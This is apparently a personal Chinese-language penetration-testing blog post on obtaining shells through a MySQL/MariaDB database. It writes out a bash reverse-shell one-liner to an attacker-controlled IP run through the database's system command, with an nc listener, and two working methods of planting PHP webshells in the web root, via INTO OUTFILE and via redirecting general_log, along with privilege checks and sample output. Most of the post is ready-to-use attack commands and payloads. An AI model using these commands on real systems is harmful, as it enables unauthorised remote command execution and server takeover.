---
title: 数据库反弹shell的几种方式
toc: true
recommend: 1
uniqueId: '2021-04-28 14:23:26/reverse-shell.html'
mathJax: false
date: 2021-04-28 22:23:26
thumbnail:
tags: [webshell,MySQL]
categories: [个人技术心得,渗透]
keywords:
---
> 反弹shell: 将已经获取控制权的机器返回一个shell给外部机器

<!-- more -->

## 反弹BASH

**在外部机器执行的指令**

```shell
nc -l {端口}
```

nc 可以用来连接到端口通信，用法是 `nc [host] [port]`，

也可以启动本机的port进行监听，使用`-l`参数

**在需要反弹机器的数据库里执行指令**

```shell
system bash -c 'bash -i &> /dev/tcp/{外部机器IP}/{端口} <&1'
```

解读指令：

从左到右进行解读，system 是数据库用来执行系统指令的，bash就不多说了，说一下他的参数。

`-c`: 代表command，后面接命令字符串，主要是为了防止其他shell的干扰

`-i`: 交互式shell

`&>`: 将标准输出和错误进行重定向

`/dev/tcp/ip/port`: bash建立socket的一种特殊写法，除此之外还有udp

`<&1`: 把标准输入重定向到标准输出, 其他写法 `0>&1`

## WebShell

### 方法一

1. 目标机器开启80端口且PHP为后端

2. 数据库的全局变量 `secure_file_priv` 值为空，不能为NULL(不能输出文件)，如果有路径代表只能输出到该路径

```sql
MariaDB root@(none):(none)> show variables like '%secure%'
| Variable_name            | Value   |
|:-------------------------|:--------|
| require_secure_transport | OFF     |
| secure_auth              | ON      |
| secure_file_priv         |         |
| secure_timestamp         | NO      |
```

3. 数据库用户有输出文件权限

```sql
select group_concat(user,0x3a,file_priv) from mysql.user;
```

3. 数据库(mysql)对 **$_SERVER['DOCUMENT_ROOT']** 有写入权限
4. 对http服务根目录输出webshell

```sql
select "<?php @system($_GET['cmd']);?>" into outfile '/srv/http/houmen.php';
```

![](https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/webshell.png)

### 方法二

如果上面的 `secure_file_priv` 规定了输出目录或者是NULL，还可以使用 `general_log` 的方法来写shell，general_log可以记录所有基础日志，默认关闭

1. 模糊查找关于general的信息

```sql
MariaDB root@(none):(none)> show variables like '%general%'
| Variable_name    | Value            |
|:-----------------|:-----------------|
| general_log      | OFF              |
| general_log_file | 				  |
```

2. 开启general_log，设置路径

```sql
MariaDB root@(none):(none)> set global general_log = 1;
MariaDB root@(none):(none)> set global general_log_file = '/srv/http/hm.php';
MariaDB root@(none):(none)> show variables like '%general%'
| Variable_name    | Value            |
|:-----------------|:-----------------|
| general_log      | ON               |
| general_log_file | /srv/http/hm.php |
```

3. 写入数据

```sql
MariaDB root@(none):(none)> select "<?php @eval($_GET['command']);?>"
```

```php
❯ sudo cat /srv/http/hm.php 
/usr/bin/mariadbd, Version: 10.5.9-MariaDB (Arch Linux). started with:
Tcp port: 3306  Unix socket: /run/mysqld/mysqld.sock
Time                Id Command  Argument
210429 17:29:36      3 Query    select "<?php @system($_GET['cmd']);?>"
```

![](https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/webshell2.png)

> 关于服务器权限的问题：
>
> 在我的MANJARO系统里，httpd的用户是http，mariadb的用户是mysql，如果根目录不做任何处理，可能会存在mysql无法写入，httpd无法读取的情况

## 总结

后端只要满足三个条件就可以反弹shell

- 支持 tcp 链接
- 支持 IO 重定向
- 可以调用系统命令

> 参考文章
>
> [常见数据库写入Webshell汇总](https://www.ascotbe.com/2020/07/21/DatabaseWriteWebshell/#post-comment)
>
> [bash -i >& /dev/tcp/localhost/8080 0>&1 的含义](https://becivells.github.io/2019/01/bash_i_dev_tcp/)

